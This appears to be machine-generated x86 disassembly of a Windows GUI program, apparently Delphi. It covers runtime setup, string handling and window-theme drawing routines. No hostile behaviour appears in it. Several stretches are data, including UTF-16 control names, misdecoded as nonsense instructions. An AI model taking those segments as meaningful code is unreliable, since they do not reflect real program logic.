push ebp
push sub_44bc9c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push ebx
mov eax [ ebp - 0x4 ]
call sub_449db8
mov ecx eax
lea eax [ esi + 0x1 ]
mov edx 0xff
call sub_44b9e8
dec eax
test eax eax
jge r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov [ esi ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bca3
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
xor eax eax
sub_44bca8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_449880
xor eax eax
push ebp
push sub_44bd73
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
xor edx edx
call sub_449d2c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bd7a
lea eax [ ebp - 0x8 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call sub_449348
retn
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x1
je r-xdata
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_449fd0
push ebx
mov eax [ ebp - 0x4 ]
call sub_449890
push eax
mov eax [ ebp - 0x8 ]
call sub_449db8
lea edx [ ebx + 0x1 ]
pop ecx
call sub_44ba78
mov ebx eax
test ebx ebx
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_44950c
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_449d80
mov edx ebx
dec edx
lea eax [ ebp - 0x8 ]
call sub_449fd0
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_449d2c
sub_44bd80
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_44be06
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
xor edx edx
call sub_449d2c
cmp [ esi ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44be0d
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
movzx ebx [ esi ]
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_449fd0
push ebx
mov eax [ ebp - 0x4 ]
call sub_449db8
lea ecx [ esi + 0x1 ]
lea edx [ ebx + 0x1 ]
call sub_44ba78
mov ebx eax
test ebx ebx
jle r-xdata
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_449d80
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_449fd0
jmp r-xdata
mov eax edi
mov edx [ ebp - 0x4 ]
call sub_449d2c
sub_44be28
push ebx
push esi
push eax
mov eax 0x2
add esp 0xfffff004
push eax
dec eax
jne r-xdata
mov eax [ esp + 0x2000 ]
add esp 0x4
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x2000
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_449ed8
push 0x1000
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_44b1e4
push eax
call LoadStringW
mov ecx eax
mov edx esp
mov eax esi
call sub_449e68
jmp r-xdata
sub_44bea8
call GetVersion
mov edx eax
and edx 0xff
and eax 0xff00
shr eax 0x8
cmp edx 0x5
jne r-xdata
cmp edx 0x5
jbe r-xdata
cmp eax 0x1
jae r-xdata
mov [ rw-data ] 0x409
retn
mov [ rw-data ] 0x7f
retn
sub_44bee4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44bf42
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bf49
retn
mov eax rw-data
call sub_447a00
mov eax rw-data
call sub_447a00
mov eax rw-data
call sub_447a00
call sub_447420
mov eax rw-data
call sub_449348
mov eax rw-data
call sub_449348
sub_44bf4c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_447268
mov [ rw-data ] 0x2
mov [ rw-data ] RaiseException
mov [ rw-data ] RtlUnwind
mov [ rw-data ] 0x2
call sub_44be94
mov [ rw-data ] eax
mov [ rw-data ] sub_44ab84
call sub_447f50
test al al
je r-xdata
call sub_44806c
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineW
mov [ rw-data ] eax
call sub_445860
mov [ rw-data ] eax
call GetACP
mov [ rw-data ] eax
mov [ rw-data ] 0x4b0
call GetCurrentThreadId
mov [ rw-data ] eax
call sub_44bea8
call sub_447f80
sub_44bffc
push esp
rol [ eax + eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
rol [ eax + eax + 0x74 ] 0x0
add [ eax ] al
loopne r-xdata
add [ gs : ebp ] ch
add [ gs : eax ] ah
add [ ebp ] ch
popad
add [ esi ] ch
popad
add [ edi ] ah
add [ gs : edx ] dh
and [ eax ] al
test eax 0x32002000
add [ eax ] dh
add [ eax ] dh
add [ ecx ] dh
add [ 0x30003200 ] ch
add [ eax ] dh
add [ esi ] dh
add [ eax ] ah
add [ ebp ] cl
imul eax [ eax ] 0x65006b
and [ eax ] al
dec esp
add [ ecx ] ch
jae r-xdata
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ ebx + eax * 8 + 0x44 ] ch
add ah ch
retn
arpl [ eax ] ax
push 0x65006b00
add [ eax ] al
add [ eax ] al
add [ edx ] ah
jne r-xdata
je r-xdata
je r-xdata
outsd
add [ esi ] ch
add [ eax ] al
add [ eax ] al
arpl [ eax ] ax
insb
add [ edi ] ch
arpl [ eax ] ax
imul eax [ eax ] 0x0
add [ ebx ] ah
outsd
add [ ebp ] ch
bound eax [ eax ]
outsd
add [ edx ] ah
outsd
add [ eax ] bh
add [ eax ] al
add [ eax ] al
add [ gs : eax + eax + 0x69 ] ah
add [ eax + eax ] dh
add [ eax ] al
add [ ebp ] ah
js r-xdata
jo r-xdata
insb
add [ edi ] ch
jb r-xdata
add [ gs : edx ] dh
bound eax [ eax ]
popad
add [ edx ] dh
add [ eax ] al
push 0x61006500
add [ eax + eax + 0x65 ] ah
add [ edx ] dh
add [ eax ] al
add [ eax ] al
insb
add [ ecx ] ch
jae r-xdata
je r-xdata
jbe r-xdata
imul eax [ eax ] 0x770065
add [ eax ] al
add [ eax ] al
insd
add [ ebp ] ah
outsb
add [ ebp ] dh
add [ eax ] al
add [ eax ] al
jo r-xdata
popad
add [ edi ] ah
add [ gs : eax ] al
add [ eax ] al
add [ eax ] dh
jb r-xdata
outsd
add [ edi ] ah
jb r-xdata
add [ gs : ebx ] dh
jae r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ gs : edx ] ah
popad
add [ edx ] dh
add [ eax ] al
jae r-xdata
arpl [ eax ] ax
jb r-xdata
outsd
add [ eax + eax + 0x6c ] ch
add [ edx ] ah
popad
add [ edx ] dh
add [ eax ] al
jae r-xdata
jo r-xdata
imul eax [ eax ] 0x6e
add [ eax ] al
jae r-xdata
je r-xdata
popad
add [ edx ] dh
je r-xdata
jo r-xdata
popad
add [ esi ] ch
add [ gs : eax + eax ] ch
add [ eax ] al
add [ ebx ] dh
je r-xdata
popad
add [ eax + eax + 0x75 ] dh
add [ ebx ] dh
add [ eax ] al
add [ eax ] al
je r-xdata
popad
add [ edx ] ah
add [ eax ] al
je r-xdata
popad
add [ ebx ] dh
imul eax [ eax ] 0x62
add [ ecx ] ah
outsb
add [ eax + eax ] ah
add [ eax ] al
add [ eax + eax + 0x61 ] dh
add [ ebx ] dh
imul eax [ eax ] 0x62
add [ ecx ] ah
jb r-xdata
add [ eax ] al
je r-xdata
outsd
add [ edi ] ch
insb
add [ edx ] ah
popad
add [ edx ] dh
add [ eax ] al
je r-xdata
outsd
add [ edi ] ch
insb
add [ eax + eax + 0x69 ] dh
add [ eax ] dh
add [ eax ] al
je r-xdata
jb r-xdata
popad
add [ ebx ] ah
imul eax [ eax ] 0x62
add [ ecx ] ah
jb r-xdata
add [ eax ] al
add [ eax ] al
je r-xdata
jb r-xdata
popad
add [ ecx ] bh
outsb
add [ edi ] ch
je r-xdata
imul eax [ eax ] 0x790066
add [ eax ] al
add [ eax ] al
je r-xdata
jb r-xdata
add [ gs : ebp ] ah
jbe r-xdata
imul eax [ eax ] 0x770065
add [ eax ] al
add [ eax ] al
ja r-xdata
imul eax [ eax ] 0x64006e
outsd
add [ edi ] dh
add [ eax ] al
add [ eax ] al
sub_44c25c
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx 0x64
mov edx [ rw-data ]
mov eax ebx
call sub_48f2b0
cmp eax 0x64
sete al
push r-xdata
call RegisterWindowMessageW
mov [ rw-data ] eax
sub_44c2e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448180
call sub_41da34
mov [ esi + 0x5 ] al
mov eax r-xdata
call sub_43a810
cmp eax 0x60000
setae al
mov [ esi + 0x4 ] al
mov eax esi
call sub_44cfb4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_44c394
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
movzx eax bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
movzx eax bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_44c400
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_44c444
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
movzx edx [ ebp - 0xc ]
mov eax ebx
call sub_44c394
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_44c490
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
movzx edx [ ebp - 0xc ]
mov eax ebx
call sub_44c394
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44c4d4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
movzx edx [ ebp - 0xc ]
mov eax ebx
call sub_44c394
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44c524
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
movzx edx [ ebp - 0xc ]
mov eax ebx
call sub_44c394
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44c568
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
movzx edx [ ebx ]
mov eax esi
call sub_44c394
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_44c5d0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
movzx ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_44c568
pop ebx
pop ebp
retn 0xc
sub_44c5ec
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
movzx ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_44c568
pop ebx
pop ebp
retn 0xc
sub_44c608
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] edx
mov edi [ ebp + 0x14 ]
movzx edx [ ebp - 0x10 ]
call sub_44c394
mov esi eax
mov ebx edi
test ebx ebx
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax edi
call sub_449ba4
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub ebx 0x4
mov eax [ ebx ]
shr eax 0x1
mov ebx eax
sub_44c678
mov [ ecx ] 0x0
movzx eax dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_44c6fc
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_44c738
mov [ ecx ] 0xa
movzx eax dl
cmp eax 0x11
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
movzx eax [ eax + lookup_table_44c751 ]
jmp [ eax * 4 + jump_table_44c763 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x3
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x4
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xa
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_44c7d4
mov [ ecx ] 0xf
movzx eax dl
cmp eax 0x2b
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
movzx eax [ eax + lookup_table_44c7f1 ]
jmp [ eax * 4 + jump_table_44c81d ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xc
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x1b
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x25
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x2a
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x2b
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_44c8ec
mov [ ecx ] 0x13
movzx eax dl
cmp eax 0xe
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
jmp [ eax * 4 + jump_table_44c902 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x4
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x6
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x1
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x6
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xc
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_44c9b4
mov [ ecx ] 0x14
movzx eax dl
cmp eax 0x23
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
movzx eax [ eax + lookup_table_44c9d1 ]
jmp [ eax * 4 + jump_table_44c9f5 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x3
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x4
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x9
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x13
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x1d
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x22
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x23
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_44cac4
mov [ ecx ] 0x17
movzx eax dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
movzx eax [ eax + lookup_table_44cae1 ]
jmp [ eax * 4 + jump_table_44cb4a ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_44ce50
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call GetWindowLongW
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call GetWindowRect
mov ecx [ ebp - 0x24 ]
neg ecx
mov edx [ ebp - 0x28 ]
neg edx
lea eax [ ebp - 0x28 ]
call sub_432b28
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_44cfa6
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_44c6fc
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_44c490
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call GetWindowLongW
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_432a2c
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_44cfd0
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
call sub_44c2c8
call sub_44c3d4
test al al
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov al 0x1
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
call sub_44c25c
test al al
je r-xdata
sub_44d01c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44d061
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d068
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax rw-data
call j_sub_449348
mov eax [ rw-data ]
call sub_4481b0
sub_44d074
cld
mov [ esi ] cl
push 0xfc0000ff
mov [ esi ] cl
imul edi edi 0x88fc0000
dec esi
add [ edx - 0x1 ] ch
add [ eax ] al
cld
mov [ esi ] cl
imul edi edi 0x0
add ah bh
mov [ esi ] cl
insb
inc [ eax ]
add ah bh
mov [ esi ] cl
insd
inc [ eax ]
add ah bh
mov [ esi ] cl
outsb
inc [ eax ]
add ah bh
mov [ esi ] cl
outsd
inc [ eax ]
add ah bh
mov [ esi ] cl
push eax
inc [ eax ]
add ah bh
mov [ esi ] cl
push ecx
inc [ eax ]
add ah bh
mov [ esi ] cl
push edx
inc [ eax ]
add ah bh
mov [ esi ] cl
push ebx
inc [ eax ]
add ah bh
mov [ esi ] cl
push esp
inc [ eax ]
add ah bh
mov [ esi ] cl
push ebp
inc [ eax ]
add ah bh
mov [ esi ] cl
push esi
inc [ eax ]
add ah bh
mov [ esi ] cl
push edi
inc [ eax ]
add ah bh
mov [ esi ] cl
pop eax
